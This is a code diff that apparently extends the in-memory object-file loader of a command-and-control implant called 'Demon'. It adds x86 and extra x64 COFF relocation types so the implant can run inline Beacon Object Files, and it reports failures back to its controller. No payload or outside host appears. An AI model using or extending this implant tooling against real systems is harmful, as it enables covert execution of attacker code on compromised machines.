@@ -285,11 +285,6 @@ BOOL CoffeeProcessSections( PCOFFEE Coffee )
                 return FALSE;
             }
 
-            if ( FuncPtr )
-            {
-                PRINTF( "Coffee->Reloc->Type: %d\n", Coffee->Reloc->Type );
-            }
-
             if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr != NULL )
             {
                 // make sure that FunMap is bug enough
@@ -332,6 +327,51 @@ BOOL CoffeeProcessSections( PCOFFEE Coffee )
 
                 FuncCount++;
             }
+            else if ( Coffee->Reloc->Type == IMAGE_REL_I386_DIR32 && FuncPtr != NULL )
+            {
+                // make sure that FunMap is bug enough
+                if ( ( FuncCount + 1 ) * sizeof( UINT64 ) > Coffee->FunMapSize )
+                {
+                    // too many functions, try to reallocate without moving the buffer
+                    PrevFunMap = Coffee->FunMap;
+                    Coffee->FunMapSize += sizeof( UINT64 ) * 100;
+                    Coffee->FunMap = Instance.Win32.LocalReAlloc(
+                            Coffee->FunMap,
+                            Coffee->FunMapSize,
+                            0);
+                    if ( ! Coffee->FunMap )
+                    {
+                        PUTS( "The BOF has too many functions" );
+
+                        Instance.Win32.LocalFree( PrevFunMap );
+
+                        PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
+
+                        PackageAddInt32( Package, DEMON_TOO_MANY_FUNCS );
+                        PackageTransmit( Package, NULL, NULL );
+
+                        return FALSE;
+                    }
+                }
+
+                MemCopy( Coffee->FunMap + ( FuncCount * sizeof( UINT64 ) ), &FuncPtr, sizeof( UINT32 ) );
+
+                Offset  = ( UINT32 ) ( Coffee->FunMap + ( FuncCount * sizeof( UINT64 ) ) );
+                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
+
+                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
+
+                FuncCount++;
+            }
+            else if ( Coffee->Reloc->Type == IMAGE_REL_I386_DIR32 && FuncPtr == NULL )
+            {
+                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );
+
+                Offset  = Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset;
+                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
+
+                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
+            }
             else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr == NULL )
             {
                 MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );
@@ -344,6 +384,86 @@ BOOL CoffeeProcessSections( PCOFFEE Coffee )
 
                 Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
                 Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
+
+                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
+            }
+            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_1 && FuncPtr == NULL )
+            {
+                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );
+
+                if ( ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) ) > 0xffffffff )
+                {
+                    PUTS( "Relocation distance is over 0xffffffff" );
+                    return FALSE;
+                }
+
+                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
+                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
+                Offset += 1;
+
+                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
+            }
+            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_2 && FuncPtr == NULL )
+            {
+                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );
+
+                if ( ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) ) > 0xffffffff )
+                {
+                    PUTS( "Relocation distance is over 0xffffffff" );
+                    return FALSE;
+                }
+
+                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
+                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
+                Offset += 2;
+
+                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
+            }
+            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_3 && FuncPtr == NULL )
+            {
+                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );
+
+                if ( ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) ) > 0xffffffff )
+                {
+                    PUTS( "Relocation distance is over 0xffffffff" );
+                    return FALSE;
+                }
+
+                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
+                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
+                Offset += 3;
+
+                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
+            }
+            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_4 && FuncPtr == NULL )
+            {
+                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );
+
+                if ( ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) ) > 0xffffffff )
+                {
+                    PUTS( "Relocation distance is over 0xffffffff" );
+                    return FALSE;
+                }
+
+                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
+                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
+                Offset += 4;
+
+                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
+            }
+            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_5 && FuncPtr == NULL )
+            {
+                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );
+
+                if ( ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) ) > 0xffffffff )
+                {
+                    PUTS( "Relocation distance is over 0xffffffff" );
+                    return FALSE;
+                }
+
+                Offset  = ( ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset ) - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) ) );
+                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
+                Offset += 5;
 
                 MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
             }
@@ -370,6 +490,15 @@ BOOL CoffeeProcessSections( PCOFFEE Coffee )
                 OffsetLong += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
 
                 MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &OffsetLong, sizeof( UINT64 ) );
+            }
+            else if ( Coffee->Reloc->Type == IMAGE_REL_I386_REL32 && FuncPtr == NULL )
+            {
+                MemCopy( &Offset, Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, sizeof( UINT32 ) );
+
+                Offset  = ( Coffee->SecMap[ Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].SectionNumber - 1 ].Ptr + Offset )  - ( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress + sizeof( UINT32 ) );
+                Offset += Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ].Value;
+
+                MemCopy( Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof( UINT32 ) );
             }
             else
             {
